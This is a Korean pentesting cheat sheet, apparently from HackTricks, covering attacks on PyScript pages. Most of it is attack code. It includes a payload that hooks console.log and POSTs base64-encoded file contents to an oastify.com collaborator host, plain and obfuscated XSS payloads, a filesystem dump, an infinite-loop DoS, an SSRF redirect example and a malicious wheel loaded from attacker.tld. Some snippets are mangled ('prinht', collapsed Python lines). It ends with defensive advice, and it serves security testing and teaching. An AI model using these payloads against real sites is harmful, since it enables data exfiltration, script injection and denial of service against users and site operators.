# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript 펜테스팅 가이드

PyScript는 HTML에 Python을 통합하기 위해 개발된 새로운 프레임워크로, HTML과 함께 사용할 수 있습니다. 이 치트 시트에서는 펜테스팅 목적으로 PyScript를 사용하는 방법을 찾을 수 있습니다.

### Emscripten 가상 메모리 파일 시스템에서 파일 덤프 / 검색하기:

`CVE ID: CVE-2022-30286`\
\
코드:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten 가상 메모리 파일 시스템의 OOB 데이터 유출 (콘솔 모니터링)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### 크로스 사이트 스크립팅 (일반)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### 크로스 사이트 스크립팅 (Python 난독화)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### 크로스 사이트 스크립팅 (JavaScript 난독화)

Code:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS 공격 (무한 루프)

코드:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## 새로운 취약점 및 기술 (2023-2025)

### 제어되지 않는 리디렉션을 통한 서버 측 요청 위조 (CVE-2025-50182)

`urllib3 < 2.5.0`은 PyScript와 함께 제공되는 **Pyodide 런타임** 내에서 실행될 때 `redirect` 및 `retries` 매개변수를 무시합니다. 공격자가 대상 URL에 영향을 미칠 수 있는 경우, 개발자가 명시적으로 비활성화했음에도 불구하고 Python 코드가 교차 도메인 리디렉션을 따르도록 강제할 수 있습니다 ‑ 사실상 anti-SSRF 로직을 우회하는 것입니다.
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
`urllib3 2.5.0`에서 패치됨 – PyScript 이미지에서 패키지를 업그레이드하거나 `packages = ["urllib3>=2.5.0"]`에서 안전한 버전을 고정하세요. 자세한 내용은 공식 CVE 항목을 참조하세요.

### 임의 패키지 로딩 및 공급망 공격

PyScript는 `packages` 목록에 임의의 URL을 허용하므로, 구성을 수정하거나 주입할 수 있는 악의적인 행위자는 피해자의 브라우저에서 **완전히 임의의 Python**을 실행할 수 있습니다:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*오직 순수-Python 휠만 필요하며, WebAssembly 컴파일 단계는 필요하지 않습니다.* 구성은 사용자 제어가 아니어야 하며, HTTPS 및 SRI 해시와 함께 신뢰할 수 있는 휠을 자신의 도메인에 호스팅해야 합니다.

### 출력 정화 변경 사항 (2023+)

* `print()`는 여전히 원시 HTML을 주입하므로 XSS에 취약합니다 (위의 예시 참조).
* 새로운 `display()` 도우미는 **기본적으로 HTML을 이스케이프**합니다 – 원시 마크업은 `pyscript.HTML()`로 감싸야 합니다.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
이 동작은 2023년에 도입되었으며 공식 Built-ins 가이드에 문서화되어 있습니다. 신뢰할 수 없는 입력에 대해서는 `display()`를 사용하고 `print()`를 직접 호출하는 것을 피하십시오.

---

## 방어적 모범 사례

* **패키지를 최신 상태로 유지** – `urllib3 >= 2.5.0`으로 업그레이드하고 사이트와 함께 제공되는 휠을 정기적으로 재구축하십시오.
* **패키지 출처 제한** – PyPI 이름이나 동일 출처 URL만 참조하고, 이상적으로는 Sub-resource Integrity (SRI)로 보호하십시오.
* **콘텐츠 보안 정책 강화** – 인라인 JavaScript(`script-src 'self' 'sha256-…'`)를 허용하지 않아 주입된 `<script>` 블록이 실행되지 않도록 합니다.
* **사용자 제공 `<py-script>` / `<script type="py">` 태그 금지** – 다른 사용자에게 다시 에코하기 전에 서버에서 HTML을 정화하십시오.
* **작업자 격리** – 작업자에서 DOM에 대한 동기식 접근이 필요하지 않은 경우, `sync_main_only` 플래그를 활성화하여 `SharedArrayBuffer` 헤더 요구 사항을 피하십시오.

## 참조

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
